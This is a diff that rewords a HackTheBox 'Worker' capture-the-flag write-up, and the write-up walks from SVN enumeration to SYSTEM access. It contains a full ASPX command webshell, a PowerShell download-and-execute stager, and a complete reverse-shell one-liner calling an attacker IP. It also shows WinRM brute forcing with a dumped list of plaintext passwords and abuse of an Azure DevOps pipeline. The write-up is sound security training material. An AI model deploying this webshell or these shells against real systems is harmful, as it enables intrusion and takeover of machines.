@@ -6,9 +6,9 @@ points: 30
 rating: 4.1
 date: 2020-08-15
 avatar: assets/htb/worker.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Worker
 ---
+
 ## Useful Skills and Tools
 
 ### Interactive Windows Command/Tool List
@@ -21,7 +21,7 @@ htb_url: https://app.hackthebox.com/machines/Worker
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration by running nmap against `<YOUR_IP>`. My usual flags: `-p-`, a shorthand telling nmap to hit every port, `-sC` which is the same as `--script=default` and fires the default set of nmap enumeration scripts at the target, `-sV` to fingerprint services, and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker]
@@ -88,9 +88,9 @@ Nmap done: 1 IP address (1 host up) scanned in 113.30 seconds
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-default-iis.png)
+![](assets/wu/worker/img-1.png)
 
-nothing but default IIS on port 80, dirbuster revealed nothing of use
+port 80 served only the stock IIS page, and dirbuster turned up nothing worthwhile
 
 ### Port 3690 - Subversion
 
@@ -109,7 +109,7 @@ svn: E170013: Unable to connect to a repository at URL 'http://<YOUR_IP>'
 svn: E175003: The server at 'http://<YOUR_IP>' does not support the HTTP/DAV protocol
 ```
 
-Was not able to connect the to page as HTTP, but after some reading found that there is a `SVN://` protocol.
+Connecting over HTTP failed, but a bit of reading pointed me to the dedicated `SVN://` protocol.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker]
@@ -184,7 +184,7 @@ A    moved.txt
 Checked out revision 5.
 ```
 
-there were quite a few files here, and a subdomain `dimension.worker.htb`. I added `worker.htb` and `dimension.worker.htb` to my hosts file
+this pulled down a fair number of files along with a subdomain `dimension.worker.htb`. I appended `worker.htb` and `dimension.worker.htb` to my hosts file
 
 ```text
 This repository has been migrated and will no longer be maintaned here.
@@ -193,9 +193,9 @@ You can find the latest version at: http://devops.worker.htb
 // The Worker team :)
 ```
 
-The file `moved.txt` contained a message stating that the repo has been moved to another castle `devops.worker.htb`. I added this one to my hosts file as well
+`moved.txt` held a note saying the repo had relocated to `devops.worker.htb`. I dropped that entry into my hosts file too
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-more-virtual-hosts.png)
+![](assets/wu/worker/img-2.png)
 
 ```text
      <!-- Work -->
@@ -211,23 +211,23 @@ The file `moved.txt` contained a message stating that the repo has been moved to
                      <a href="http://story.worker.htb/">Story</a><p>Lets make a long story short, end of story</p>
 ```
 
-The file `index.html` contained another list of subdomains; again added to hosts
+`index.html` listed even more subdomains, which I likewise added to hosts
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dimension-worker.png)
+![](assets/wu/worker/img-3.png)
 
 Worker homepage using dimension theme
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-work.png)
+![](assets/wu/worker/img-4.png)
 
 Links to other pages
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-cartoon.png)
+![](assets/wu/worker/img-5.png)
 
-Cartoon character page, possible usernames?  The other pages did not contain anything that looked useful, so moved on to the `devops` domain I found earlier.
+Cartoon character page, possible usernames?  The remaining pages held nothing of interest, so I shifted my attention to the `devops` domain spotted earlier.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-devops-login.png)
+![](assets/wu/worker/img-6.png)
 
-The `devops` page required authentication
+The `devops` page demanded credentials
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker/devops]
@@ -255,7 +255,7 @@ First version
 ------------------------------------------------------------------------
 ```
 
-Next, I used the `log` command and found the commit notes that described some of the progress that had been made on the repository.
+I then ran the `log` command, which surfaced the commit messages outlining the history of work on the repo.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker/devops]
@@ -338,52 +338,52 @@ Index: moved.txt
 └─$ svn diff -r 5
 ```
 
-I checked the changes that had been made in each revision, and found that at one point a username and password had been hardcoded in the file `deploy.ps1`
+Diffing each revision revealed that, at one point, a username and password had been baked directly into `deploy.ps1`
 
 ```text
 -$user = "nathen" 
 -$plain = "wendel98"
 ```
 
-This credential set did not work for logging into the devops page, nor for WinRM. After getting no progress for awhile, I reset the box and the login worked for the devops page, still not for WinRM
+These creds were rejected by both the devops login and WinRM. After being stuck for a while, I reset the box and the devops login then accepted them, though WinRM still wouldn't
 
 ### The Azure DevOps Portal
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-ekenas.png)
+![](assets/wu/worker/img-7.png)
 
 [https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
 
-After logging in, I found myself in a Azure DevOps portal as the user named `ekenas`.
+Once authenticated, I landed in an Azure DevOps portal logged in as the user `ekenas`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-profile.png)
+![](assets/wu/worker/img-8.png)
 
-When I clicked on the profile picture, I found the user's name and domain login information.
+Clicking the profile picture exposed the user's name and domain login details.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-notifications.png)
+![](assets/wu/worker/img-9.png)
 
-I checked through the user's settings, but there wasn't anything useful. 
+I dug through the user's settings but turned up nothing of value. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-smarthotel.png)
+![](assets/wu/worker/img-10.png)
 
-Under the `ekenas` repository, there was a project for something called `SmartHotel360`
+Within the `ekenas` repository sat a project named `SmartHotel360`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-restorer.png)
+![](assets/wu/worker/img-11.png)
 
-Under the Members section of the project I found icons for 2 other users.
+The project's Members section showed avatars for 2 additional users.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-smarth-repo.png)
+![](assets/wu/worker/img-12.png)
 
 template for a page?
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-w4styt4st.png)
+![](assets/wu/worker/img-13.png)
 
-Under SmartHotel360 there was a mostly empty project called `w45ty45t`.
+Beneath SmartHotel360 was a largely empty project named `w45ty45t`.
 
 In all, found 3 usernames, and a possible password `w45ty45t`
 
 ### Crafting an .aspx reverse shell
 
-None of the usernames or potential passwords got me anywhere, so I began to look closer at what I was able to do in the `SmartHotel360` repository.
+Since none of the usernames or candidate passwords led anywhere, I turned my focus to whatever actions were available to me inside the `SmartHotel360` repository.
 
 lots of screenshots -&gt; description - had to: 1. create new branch 2. upload file to new branch 3. add work item to commit 4. approve commit 5. wait for build to complete 6. merge with master 7. navigate to webshell
 
@@ -393,19 +393,19 @@ lots of screenshots -&gt; description - had to: 1. create new branch 2. upload f
 TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
 ```
 
-Tried to push a file uploaded through the web portal but got the above message
+Attempting to push a file uploaded via the web portal threw the error above
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-testbranch.png)
+![](assets/wu/worker/img-15.png)
 
-Tried creating a new branch of the project called `test`.
+So I created a new project branch named `test`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-limited-time.png)
+![](assets/wu/worker/img-16.png)
 
-The build takes so long that the cleanup takes place too quickly to do anything... \(I think I must have finished creating my test branch just before the cleanup script or whatever cleared it the first time I did this\)
+The build runs so slowly that the cleanup fires before I can act on anything... \(I must have just managed to create my test branch right before the cleanup script wiped it out the first time around\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-fixed-pull.png)
+![](assets/wu/worker/img-17.png)
 
-Next I created a new pull request, trying to upload an `.aspx` file to see if I could get code execution.
+I then opened a new pull request, attempting to push an `.aspx` file to test whether I could land code execution.
 
 ```aspnet
 <%@ Page Language="C#" Debug="true" Trace="false" %>
@@ -452,37 +452,37 @@ Response.Write("</pre>");
 <!--    http://michaeldaw.org   04/2007    -->
 ```
 
-The asp.net webshell by Dominic Chell, downloaded from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx).
+This is Dominic Chell's asp.net webshell, grabbed from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx).
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-approve.png)
+![](assets/wu/worker/img-18.png)
 
-After I submitted the pull request I had to approve it.  Luckily this user had the necessary permissions.
+Once the pull request was filed I needed to approve it.  Fortunately this account held the right permissions.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test--pull.png)
+![](assets/wu/worker/img-19.png)
 
-Approved the file pull request and completed it.  If you have problems, make sure to check the `Policies` section on the right, as it does checks that have to be met first.
+Approved the file pull request and completed it.  If you run into trouble, look at the `Policies` section on the right, since it enforces checks that must pass first.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-uploaded.png)
+![](assets/wu/worker/img-20.png)
 
-My test branches were deleted multiple times before I figured out the rhythm of the portal and how to do everything.
+My test branches got wiped several times before I learned the timing of the portal and worked out the full procedure.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-fail.png)
+![](assets/wu/worker/img-21.png)
 
 Tried to access my web shell, but it said it wasn't there...
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload--link-work-first.png)
+![](assets/wu/worker/img-22.png)
 
 Next I merged my test branch into the master
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-test-upload-win.png)
+![](assets/wu/worker/img-23.png)
 
-After a lot of trial and error, I was able to upload my webshell, and tried to run a reverse shell script from my attack machine.
+After plenty of trial and error I managed to get the webshell uploaded, then attempted to fire off a reverse shell script from my attacking box.
 
 ```text
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.98:8909/revShell.ps1')"
 ```
 
-Put this command into the webshell input as a stager to get my reverse shell powershell script from my waiting python http server
+I fed this command into the webshell as a stager to pull my reverse shell PowerShell script from the python http server I had standing by
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker]
@@ -491,13 +491,13 @@ Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 <YOUR_IP> - - [12/Dec/2020 17:35:03] "GET /revShell.ps1 HTTP/1.1" 200 -
 ```
 
-got connection to my waiting webserver which hosted a reverse shell ps1 script
+my listening webserver, hosting the reverse shell ps1 script, received the connection
 
 ```text
 $client = New-Object System.Net.Sockets.TCPClient("10.10.15.98",8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-My PowerShell script consisted of a reverse shell one-liner found on [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
+My PowerShell script was a reverse shell one-liner taken from [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
 
 ## Initial Foothold
 
@@ -550,9 +550,9 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 PS C:\windows\system32\inetsrv>
 ```
 
-I was able to get a reverse shell after uploading and running my PowerShell script!
+Uploading and running my PowerShell script landed me a reverse shell!
 
-I was logged in as the service account `iis apppool\defaultapppool`.  SeImpersonatePrivilege sounded interesting
+I came in as the service account `iis apppool\defaultapppool`.  SeImpersonatePrivilege caught my eye
 
 ## Road to User
 
@@ -700,7 +700,7 @@ zitnot                   zoeoak
 The command completed with one or more errors.
 ```
 
-net user showed a very long list of usernames
+net user printed an extremely long roster of usernames
 
 ```text
 PS C:\windows\system32\inetsrv> ls \users
@@ -717,7 +717,7 @@ d-----       2020-07-22     01:11                restorer
 d-----       2020-07-08     19:22                robisl
 ```
 
-however there were only three user folder: `robisl`, `restorer`, and `Administrator`
+yet only three actual user folders existed: `robisl`, `restorer`, and `Administrator`
 
 [https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows](https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows)
 
@@ -730,7 +730,7 @@ C                  19,66          9,74 FileSystem    C:\                        
 W                   2,52         17,48 FileSystem    W:\
 ```
 
-There was a second logical disk attached to the machine
+A second logical volume was mounted on the machine
 
 ```text
 PS W:\> ls 
@@ -745,7 +745,7 @@ d-----       2020-04-03     11:31                sites
 d-----       2020-06-20     16:04                svnrepos
 ```
 
-It looked like this is where the svn repos were stored
+This appeared to be where the svn repos lived
 
 ```text
 PS W:\> tree sites
@@ -839,7 +839,7 @@ W:\SITES
     ????images
 ```
 
-I found the data for the websites in the `sites` folder,
+The website content was sitting in the `sites` folder,
 
 ```text
 PS W:\> tree /F svnrepos
@@ -905,7 +905,7 @@ W:\SVNREPOS
             db.lock
 ```
 
-That `passwd` file in `W:\svnrepos\www\conf\` looked interesting
+The `passwd` file under `W:\svnrepos\www\conf\` stood out as promising
 
 ### Finding user creds
 
@@ -959,19 +959,19 @@ sapket = hamburger
 sarkil = friday
 ```
 
-In the folder `W:\svnrepos\www\conf` there was a file `passwd` that contained a list of usernames and passwords. This looked like a good time to brute force WinRM
+The `passwd` file inside `W:\svnrepos\www\conf` held a list of usernames paired with passwords. That made it a prime candidate for brute forcing WinRM
 
 ### Port 5985 - WinRM
 
 [https://github.com/mchoji/winrm-brute](https://github.com/mchoji/winrm-brute)
 
-used `winrm-brute` to cycle through the list of usernames and passwords
+I used `winrm-brute` to iterate through the username and password list
 
 ```text
 [SUCCESS] user: robisl password: wolves11
 ```
 
-Retrieved the password for one of the users `robisl`
+This recovered valid credentials for the user `robisl`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/worker/winrm-brute]
@@ -1015,7 +1015,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Using `evil-winrm` I was able to login with the password specified for `robisl`
+With `evil-winrm` I logged in successfully using the password listed for `robisl`
 
 ### User.txt
 
@@ -1033,62 +1033,62 @@ Mode                LastWriteTime         Length Name
 6266************************2a34
 ```
 
-On the user's desktop I found the `user.txt` flag
+The `user.txt` flag was sitting on the user's desktop
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `robisl`
 
-After searching high and low and enumerating as much as I could, I didn't find anything useful.
+Despite enumerating thoroughly and looking everywhere, I came up empty.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sign-inas.png)
+![](assets/wu/worker/img-24.png)
 
-I tried to switch users to `robisl` in the `devops` portal.
+I attempted to switch over to `robisl` within the `devops` portal.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sign-inas-fail%2520%25281%2529.png)
 
-I tried switching users in the `devops` page I had open, but received an error message saying that this user did not have the permissions needed to view project-level information.
+Switching users in the `devops` page I still had open produced an error stating this account lacked the permissions to see project-level details.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-partsunlimited.png)
+![](assets/wu/worker/img-26.png)
 
- I decided to try `robisl`'s credentials on a fresh `devops` page after closing it and clearing my cache, and was happy to see that I was logged in to a different project.
+ So I closed the page, cleared my cache, and tried `robisl`'s credentials on a fresh `devops` session, and was pleased to find myself signed in to a different project.
 
 * [https://azure.microsoft.com/en-us/services/devops/](https://azure.microsoft.com/en-us/services/devops/)
 * [https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops](https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)
 
 > Azure Pipelines provides a quick, easy, and safe way to automate building your projects and making them available to users.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-pipeline.png)
+![](assets/wu/worker/img-27.png)
 
-This sounds like a good way to try to get code execution...I wonder if there is a way to run it in the context of `Administrator`?  I put some code in the `azure-pipelines.yml` that I hoped would execute and download my reverse shell script.
+This looks like a promising route to code execution...I wonder whether it can be run as `Administrator`?  I dropped some code into `azure-pipelines.yml` that I expected would fire and fetch my reverse shell script.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-build-failed%2520%25281%2529.png)
 
-Unfortunately this did not work.  After doing even more reading, I found that I had to assign an agent from the pool to build the project.
+That attempt failed.  More reading taught me I first had to assign an agent from the pool to build the project.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-agent-pool-setup%2520%25281%2529.png)
 
 Agetnt pool selection
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-agent-pool-setup2.png)
+![](assets/wu/worker/img-30.png)
 
 Assign the job to the agent
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-run.png)
+![](assets/wu/worker/img-31.png)
 
 Save and run
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-building%2520%25281%2529.png)
 
-The build job was started
+The build job kicked off
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-success%2520%25281%2529.png)
 
-The job built successfully, but my script failed to run. I checked my syntax on everything and made sure I did all of the proper steps and tried again.
+The build completed, but my script didn't execute. I double-checked all my syntax, confirmed I had followed every step correctly, and gave it another go.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-success2.png)
+![](assets/wu/worker/img-34.png)
 
-Unfortunately I don't remember exactly what I had done wrong, or how I fixed it \(I need to take more detailed notes, I guess!\).  However, after a lot of trial and error, I was able to get the project to build and also execute my script.  No I hoped that it would actually execute the PowerShell script and send me a reverse shell!
+I can't recall exactly what I had gotten wrong or how I corrected it \(clearly I need to keep more thorough notes!\).  Still, after a great deal of trial and error, I got the project to build and run my script.  Now I was hoping it would really execute the PowerShell script and hand me a reverse shell!
 
 New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 
@@ -1099,7 +1099,7 @@ Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 <YOUR_IP> - - [12/Dec/2020 20:32:32] "GET /revShell.ps1 HTTP/1.1" 200 -
 ```
 
-My waiting python HTTP server got a connection request, and I could see that it sent the script.
+The python HTTP server I had waiting received a request and I could see the script being delivered.
 
 ### Getting a shell
 
@@ -1179,7 +1179,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 PS W:\agents\agent11\_work\8\s>
 ```
 
-I was happy to see that my script worked, and I got a reverse shell as `NT Authority/System`!
+To my delight the script worked and delivered a reverse shell running as `NT Authority/System`!
 
 ### Root.txt
 
